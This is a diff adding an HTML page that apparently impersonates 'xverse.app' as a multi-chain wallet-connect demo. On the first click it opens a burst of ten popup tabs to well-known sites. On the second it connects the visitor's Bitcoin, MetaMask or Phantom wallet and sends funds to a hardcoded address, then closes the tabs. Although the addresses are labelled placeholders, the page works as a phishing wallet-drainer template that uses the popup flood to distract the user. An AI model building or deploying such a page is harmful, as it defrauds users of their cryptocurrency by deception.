@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>xverse.app - Wallet Connect (Multi-Chain)</title>
+  <style>
+    html, body { margin:0; height:100%; background:#0a1a2a; color:#e0f7fa; font-family:system-ui; display:grid; place-items:center; }
+    .card { background:#122240; padding:24px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.5); max-width:480px; text-align:center; }
+    h1 { margin:0 0 8px; font-size:22px; color:#00c853; }
+    p { margin:8px 0 16px; font-size:14px; color:#80deea; }
+    .row { display:flex; gap:8px; justify-content:center; align-items:center; margin-bottom:10px; flex-wrap:wrap; }
+    select, input { background:#0b1b2b; color:#e0f7fa; border:1px solid #204262; border-radius:10px; padding:8px 10px; font-size:14px; }
+    .img-btn {
+      width:100px; height:100px; cursor:pointer; border-radius:50%;
+      box-shadow:0 8px 32px rgba(0,200,83,0.5); transition:transform 0.2s;
+      filter: drop-shadow(0 0 10px #00c853);
+    }
+    .img-btn:hover { transform:scale(1.12); }
+    .img-btn.ready { animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.2); } }
+    #status { margin-top:16px; color:#80deea; font-size:14px; word-break:break-word; }
+    .kraken-logo { font-size:28px; margin-bottom:12px; font-weight:900; letter-spacing:1px; }
+    .loader { width:40px; height:40px; border:4px solid #1a3a5c; border-top:4px solid #00c853; border-radius:50%; animation:spin 1s infinite linear; margin:20px auto; display:none; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    code { background:#0a1a2a; color:#00e676; padding:2px 6px; border-radius:4px; font-size:13px; }
+    .address { font-family: monospace; font-size: 15px; color: #00e676; }
+    .amount { color:#ff9800; font-weight:bold; }
+    small.hint { display:block; opacity:.8; margin-top:4px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="kraken-logo">MULTI-CHAIN DEMO</div>
+    <h1>Wallet Connect</h1>
+
+    <div class="row">
+      <label for="chain">Chain:</label>
+      <select id="chain">
+        <option value="bitcoin" selected>Bitcoin (Xverse)</option>
+        <option value="evm">EVM (MetaMask)</option>
+        <option value="solana">Solana (Phantom)</option>
+      </select>
+
+      <label for="network">Network:</label>
+      <select id="network"></select>
+    </div>
+
+    <div class="row" id="amountRow">
+      <label for="amount">Amount:</label>
+      <input id="amount" type="text" value="0.00001" style="width:110px;">
+      <span id="unit">BTC</span>
+    </div>
+
+    <p id="instruction">Tap icon to prepare connection...</p>
+
+    <!-- GAMBAR = TOMBOL -->
+    <img
+      src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgcj0iNDUiIGZpbGw9IiMwMGM4NTMiLz48cGF0aCBkPSJNNTAgMzBMMjUgNjVsMjUgMjV6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg=="
+      alt="Connect"
+      class="img-btn"
+      id="connectImg"
+    />
+
+    <div class="loader" id="loader"></div>
+    <div id="status"></div>
+    <small class="hint">Klik ikon sekali untuk "burst" tab, lalu klik lagi untuk connect + send.</small>
+  </div>
+
+  <!-- BTC: Sats Connect (ESM) -->
+  <script type="module">
+    import { request, RpcErrorCode } from "https://esm.sh/sats-connect@latest";
+    window.SATS = { request, RpcErrorCode };
+  </script>
+
+  <!-- Solana web3.js (IIFE) for Phantom -->
+  <script src="https://unpkg.com/@solana/web3.js@1.95.1/lib/index.iife.min.js"></script>
+
+  <script>
+    // ====== KONFIGURASI ADDRESS DEFAULT (GANTI SESUAI KEBUTUHAN) ======
+    const DEFAULTS = {
+      bitcoin: {
+        networks: ["Mainnet", "Testnet", "Signet"],
+        unit: "BTC",
+        // amount input dalam BTC → dikonversi ke satoshi
+        targetAddress: "bc1q2x0d48y878m8kgc7cpun5h9a5k5l33cy2khlzf", // dummy
+        defaultAmount: "0.00001"
+      },
+      evm: {
+        networks: ["Mainnet", "Sepolia"],
+        unit: "ETH",
+        // 0 ETH untuk test (tetap ada gas)
+        targetAddress: "0x0000000000000000000000000000000000000001", // placeholder aman
+        defaultAmount: "0"
+      },
+      solana: {
+        networks: ["mainnet-beta", "devnet"],
+        unit: "SOL",
+        targetAddress: "8K8iXJ8g1tAfJ3cGqzQw6b7Vx7F5rXy4VnC7t18NRVhV", // placeholder
+        defaultAmount: "0.001"
+      }
+    };
+
+    // ====== ELEMEN UI ======
+    const statusEl = document.getElementById("status");
+    const loader = document.getElementById("loader");
+    const imgBtn = document.getElementById("connectImg");
+    const instruction = document.getElementById("instruction");
+    const chainSel = document.getElementById("chain");
+    const netSel = document.getElementById("network");
+    const amountInput = document.getElementById("amount");
+    const unitSpan = document.getElementById("unit");
+
+    // ====== POPUP BURST ======
+    const TARGETS = [
+      "https://www.google.com/csi",
+      "https://www.wikipedia.org/",
+      "https://www.youtube.com/robots.txt",
+      "https://www.apple.com/contact/",
+      "https://www.microsoft.com/",
+      "https://www.amazon.com/robots.txt",
+      "https://www.instagram.com/",
+      "https://www.yahoo.com/",
+      "https://www.reddit.com/robots.txt",
+      "https://developer.mozilla.org/"
+    ];
+    let handles = [];
+    let burstDone = false;
+
+    function openBurst(count = 10) {
+      const h = [];
+      let opened = 0;
+      for (let i = 0; i < count; i++) {
+        const url = TARGETS[i % TARGETS.length];
+        const delay = i * 50 + Math.floor(Math.random() * 30);
+        setTimeout(() => {
+          try {
+            const win = window.open(url, "_blank");
+            if (win) { h.push(win); opened++; }
+          } catch (_) {}
+        }, delay);
+      }
+      setTimeout(() => {
+        statusEl.innerHTML = `Burst: ${opened}/${count} tabs opened.<br/><strong>Tap again to send!</strong>`;
+        loader.style.display = 'none';
+        imgBtn.classList.add('ready');
+        instruction.textContent = "Tap again to connect & send";
+        burstDone = true;
+        handles = h;
+      }, count * 55 + 200);
+    }
+
+    // ====== UTIL ======
+    const btcToSats = (btcStr) => {
+      const [i, f=''] = String(btcStr).trim().split('.');
+      const frac = (f + '0'.repeat(8)).slice(0,8);
+      return BigInt(i || '0') * 10n**8n + BigInt(frac);
+    };
+    const ethToHexWei = (ethStr) => {
+      const [i, f=''] = String(ethStr).trim().split('.');
+      const frac = (f + '0'.repeat(18)).slice(0,18);
+      const wei = BigInt(i || '0') * 10n**18n + BigInt(frac);
+      return '0x' + wei.toString(16);
+    };
+
+    function setChainDefaults() {
+      const cfg = DEFAULTS[chainSel.value];
+      // isi networks
+      netSel.innerHTML = '';
+      cfg.networks.forEach(n => {
+        const o = document.createElement('option');
+        o.value = n; o.textContent = n;
+        netSel.appendChild(o);
+      });
+      // isi unit & default amount
+      unitSpan.textContent = cfg.unit;
+      amountInput.value = cfg.defaultAmount;
+      statusEl.textContent = '';
+      instruction.textContent = "Tap icon to prepare connection...";
+      imgBtn.classList.remove('ready');
+      burstDone = false;
+    }
+
+    chainSel.addEventListener('change', setChainDefaults);
+    setChainDefaults();
+
+    // ====== CORE SEND PER CHAIN ======
+    async function sendBitcoin() {
+      const NETWORK = netSel.value; // Mainnet/Testnet/Signet
+      const amountSats = btcToSats(amountInput.value);
+      const TARGET_ADDRESS = DEFAULTS.bitcoin.targetAddress;
+
+      // Connect
+      const connectRes = await window.SATS.request('wallet_connect', {
+        addresses: ['payment'],
+        message: `Connect dApp (request ${amountInput.value} BTC)`,
+        network: NETWORK
+      });
+      if (connectRes.status !== 'success') {
+        const msg = connectRes.error?.message || 'Connection failed';
+        throw new Error(msg);
+      }
+      const paymentAddr = (connectRes.result.addresses||[]).find(a=>a.purpose==='payment')?.address;
+      if (!paymentAddr) throw new Error('No payment address returned by wallet.');
+
+      statusEl.innerHTML = `Connected (BTC): <span class="address">${paymentAddr}</span><br>Sending <b class="amount">${amountInput.value} BTC</b>...`;
+
+      // Send
+      const sendRes = await window.SATS.request('sendTransfer', {
+        recipients: [{ address: TARGET_ADDRESS, amount: Number(amountSats.toString()) }] // sats (number)
+      });
+      if (sendRes.status !== 'success') {
+        throw new Error(sendRes.error?.message || 'Transfer failed');
+      }
+      const txid = sendRes.result?.txid || '(no-txid-returned)';
+      return { txid, explorer: `https://mempool.space/tx/${txid}` };
+    }
+
+    async function ensureEvmNetwork(chainIdHex) {
+      const ethereum = window.ethereum;
+      try {
+        await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainIdHex }] });
+      } catch (e) {
+        // 4902 = chain not added
+        if (e && e.code === 4902) {
+          const params = (chainIdHex === '0xaa36a7') ? {
+            chainId: '0xaa36a7',
+            chainName: 'Sepolia',
+            nativeCurrency: { name: 'Sepolia ETH', symbol: 'ETH', decimals: 18 },
+            rpcUrls: ['https://rpc.sepolia.org'],
+            blockExplorerUrls: ['https://sepolia.etherscan.io']
+          } : {
+            chainId: '0x1',
+            chainName: 'Ethereum Mainnet',
+            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+            rpcUrls: ['https://rpc.ankr.com/eth'],
+            blockExplorerUrls: ['https://etherscan.io']
+          };
+          await ethereum.request({ method: 'wallet_addEthereumChain', params: [params] });
+        } else {
+          throw e;
+        }
+      }
+    }
+
+    async function sendEvm() {
+      const ethereum = window.ethereum;
+      if (!ethereum) throw new Error("EVM provider not found. Install MetaMask.");
+
+      // pick network
+      const net = netSel.value; // Mainnet/Sepolia
+      const chainIdHex = (net === 'Sepolia') ? '0xaa36a7' : '0x1';
+      await ensureEvmNetwork(chainIdHex);
+
+      // request accounts
+      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      const from = accounts[0];
+      const to = DEFAULTS.evm.targetAddress;
+      const valueHex = ethToHexWei(amountInput.value); // '0x0' untuk 0 ETH
+
+      statusEl.innerHTML = `Connected (EVM): <span class="address">${from}</span><br>Sending <b class="amount">${amountInput.value} ETH</b>...`;
+
+      const txHash = await ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{ from, to, value: valueHex }]
+      });
+
+      const explorer = (net === 'Sepolia')
+        ? `https://sepolia.etherscan.io/tx/${txHash}`
+        : `https://etherscan.io/tx/${txHash}`;
+
+      return { txid: txHash, explorer };
+    }
+
+    async function sendSolana() {
+      if (!window.solana || !window.solana.isPhantom) {
+        throw new Error("Solana provider (Phantom) not found.");
+      }
+      const solanaWeb3 = window.solanaWeb3;
+      const connection = new solanaWeb3.Connection(
+        solanaWeb3.clusterApiUrl(netSel.value), // mainnet-beta/devnet
+        'confirmed'
+      );
+
+      const resp = await window.solana.connect();
+      const fromPubkey = resp.publicKey;
+      const toPubkey = new solanaWeb3.PublicKey(DEFAULTS.solana.targetAddress);
+
+      // amount in SOL → lamports
+      const lamports = (() => {
+        const [i, f=''] = String(amountInput.value).trim().split('.');
+        const frac = (f + '0'.repeat(9)).slice(0,9);
+        return BigInt(i || '0') * 10n**9n + BigInt(frac);
+      })();
+
+      statusEl.innerHTML = `Connected (SOL): <span class="address">${fromPubkey.toBase58()}</span><br>Sending <b class="amount">${amountInput.value} SOL</b>...`;
+
+      const tx = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey,
+          toPubkey,
+          lamports: Number(lamports.toString())
+        })
+      );
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+      tx.recentBlockhash = blockhash;
+      tx.feePayer = fromPubkey;
+
+      const signed = await window.solana.signAndSendTransaction(tx);
+      await connection.confirmTransaction({ signature: signed.signature, blockhash, lastValidBlockHeight }, 'confirmed');
+
+      const explorer = (netSel.value === 'devnet')
+        ? `https://explorer.solana.com/tx/${signed.signature}?cluster=devnet`
+        : `https://explorer.solana.com/tx/${signed.signature}`;
+
+      return { txid: signed.signature, explorer };
+    }
+
+    async function connectAndSend() {
+      loader.style.display = 'block';
+      statusEl.innerHTML = "Connecting to wallet...";
+
+      try {
+        const chain = chainSel.value;
+        let result;
+
+        if (chain === 'bitcoin') {
+          result = await sendBitcoin();
+        } else if (chain === 'evm') {
+          result = await sendEvm();
+        } else if (chain === 'solana') {
+          result = await sendSolana();
+        } else {
+          throw new Error('Unsupported chain');
+        }
+
+        statusEl.innerHTML = `
+          SUCCESS!<br>
+          Sent <b class="amount">${amountInput.value} ${unitSpan.textContent}</b><br>
+          <small>TxID: <code>${result.txid}</code></small><br>
+          ${result.explorer ? `<a href="${result.explorer}" target="_blank" rel="noreferrer">Open in explorer</a>` : ''}
+        `;
+        document.title = `Multi-Chain - Sent ${amountInput.value} ${unitSpan.textContent}`;
+        imgBtn.classList.remove('ready');
+
+        // cleanup burst tabs
+        setTimeout(() => {
+          handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_) {} });
+        }, 1200);
+
+      } catch (err) {
+        statusEl.innerHTML = `Failed: ${err.message || "User rejected"}`;
+        console.error("[TX ERROR]", err);
+      } finally {
+        loader.style.display = 'none';
+      }
+    }
+
+    // UX flow: click #1 = burst, click #2 = connect+send
+    imgBtn.addEventListener("click", () => {
+      if (!burstDone) {
+        statusEl.textContent = "Launching connection race...";
+        loader.style.display = 'block';
+        openBurst(10);
+      } else {
+        connectAndSend();
+      }
+    });
+  </script>
+</body>
+</html>
